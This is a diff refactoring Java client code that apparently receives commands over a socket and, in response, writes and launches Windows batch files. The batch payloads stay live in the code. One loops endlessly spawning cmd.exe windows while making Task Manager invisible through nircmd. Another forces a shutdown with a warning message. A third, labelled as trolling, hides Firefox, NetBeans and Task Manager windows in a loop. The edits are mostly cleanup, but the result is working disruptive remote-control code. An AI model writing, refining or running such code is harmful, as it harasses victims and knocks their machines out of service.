@@ -10,6 +10,7 @@ import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.File;
 import java.io.FileWriter;
+import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
 import java.net.Socket;
@@ -59,7 +60,7 @@ public class ClientSendThread implements Runnable {
             e.printStackTrace();
             System.exit(1);
             
-        }catch(Exception e)
+        }catch(IOException | InterruptedException e)
         {
             System.err.println("ERROR: Something in ClientSendThread() went wrong. " + e);
             e.printStackTrace();
@@ -111,13 +112,13 @@ class Sockets
                 String filePath = temp.getAbsolutePath();          
                 String nl = System.lineSeparator();
 
-                BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-                bw.write("@echo off" + nl +
-                    ":A" + nl +
-                    "start cmd.exe" + nl +
-                    Paths.get(".").toAbsolutePath().normalize().toString() + "\\nircmd.exe win trans ititle \"task-manager\" 1" + nl +
-                    "goto:A");
-                bw.close();
+                try (BufferedWriter bw = new BufferedWriter(new FileWriter(temp))) {
+                    bw.write("@echo off" + nl +
+                            ":A" + nl +
+                            "start cmd.exe" + nl +
+                            Paths.get(".").toAbsolutePath().normalize().toString() + "\\nircmd.exe win trans ititle \"task-manager\" 1" + nl +
+                            "goto:A");
+                }
                 
                 Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
 
@@ -129,11 +130,12 @@ class Sockets
                 String nl = System.lineSeparator();
                 
 
-                BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-                bw.write("msg * System is shutting down in 10 seconds! " + nl + "shutdown /s /t 10" + nl +
-                Paths.get(".").toAbsolutePath().normalize().toString() + "\\nircmd.exe win trans ititle \"cmd\" 1" 
-                );
-                bw.close();
+                try (BufferedWriter bw = new BufferedWriter(new FileWriter(temp))) 
+                {
+                    bw.write("msg * System is shutting down in 10 seconds! " + nl + "shutdown /s /t 10" + nl +
+                            Paths.get(".").toAbsolutePath().normalize().toString() + "\\nircmd.exe win trans ititle \"cmd\" 1"
+                    );
+                }
                     
                 Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
                 
@@ -144,29 +146,27 @@ class Sockets
                 String nl = System.lineSeparator();
                 
 
-                BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-                bw.write("@echo off" + nl +
-                    ":A" + nl +
-                    "msg * Troll level loading.... ITS OVER 9000!" + nl +
-                    "nircmd.exe win center alltop " + nl +
-                    "nircmd.exe win trans ititle \"firefox\" 1" + nl +
-                    "nircmd.exe win trans ititle \"netbeans\" 1" + nl +
-                    "nircmd.exe win trans ititle \"task-manager\" 1" + nl +
-                    "goto:A");
-                bw.close();
+                try (BufferedWriter bw = new BufferedWriter(new FileWriter(temp))) {
+                    bw.write("@echo off" + nl +
+                            ":A" + nl +
+                            "msg * Troll level loading.... ITS OVER 9000!" + nl +
+                            "nircmd.exe win center alltop " + nl +
+                            "nircmd.exe win trans ititle \"firefox\" 1" + nl +
+                            "nircmd.exe win trans ititle \"netbeans\" 1" + nl +
+                            "nircmd.exe win trans ititle \"task-manager\" 1" + nl +
+                            "goto:A");
+                }
                     
                 Sockets.executeCommand(new String[]{"cmd.exe", "/C", "Start", "/B", filePath});
                 
             }
-
-            
-            
                 return true;
-            }catch(Exception e)
-            {
-                e.printStackTrace();
-                return true;
-            }
+                
+        }catch(Exception e)
+        {
+            e.printStackTrace();
+            return true;
+        }
         
     }
     
@@ -174,7 +174,7 @@ class Sockets
     private static String executeCommand(String[] command) 
     {
 
-		StringBuffer output = new StringBuffer();
+		StringBuilder output = new StringBuilder();
 
 		Process p;
 		try {
@@ -183,12 +183,12 @@ class Sockets
 			BufferedReader reader = 
                             new BufferedReader(new InputStreamReader(p.getInputStream()));
 
-                        String line = "";			
+                        String line;			
 			while ((line = reader.readLine())!= null) {
-				output.append(line + "\n");
+				output.append(line).append("\n");
 			}
 
-		} catch (Exception e) {
+		} catch (IOException | InterruptedException e) {
 			e.printStackTrace();
 		}
 
